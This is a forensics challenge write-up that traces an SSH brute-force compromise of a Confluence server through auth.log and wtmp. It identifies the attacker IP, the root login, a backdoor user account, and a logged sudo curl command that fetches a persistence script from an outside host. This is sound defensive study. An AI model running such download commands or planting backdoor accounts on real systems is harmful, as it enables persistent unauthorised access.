Machine/Logs=Brutus | Creator=cyberjunkie

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

** Initial thoughts on the auth.log and understanding that I have, it follows by Date MM-DD followed by HH:MM:SS, then the external IP of the server, then Service and finished with the context of the log.
** Kali was unable to understand how to read wtmp files. Researching I found you can use the 'last' and 'utmpdump' commands to read the file as | 'cat' spits out garbage. > Can be filtered down by the command 'strings'.

Questions:
Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
The authentication failures begin from the IP below to the server.
[65.2.161.68]

The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
Attempts on a svc account and server_adm were attempted but unsuccessful, success came through for the user:
[root]

Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
First login to the server from the IP:
[2024-03-06T06:32:45,387923+00:00]

SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
The next line after Question 2 in auth.log: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
[37]

The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
Viewable by the logs I have copied below:
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
[cyberjunkie]

What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
Since the account is created locally on the server, it is:
[T1136.001]

What time did the attacker's first SSH session end according to auth.log?
Copying the logs from the auth.log which are seen below, we can see the attacker disconnects and the server closes the session.
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.

The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
Full-command can be visualised below:
[sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh]
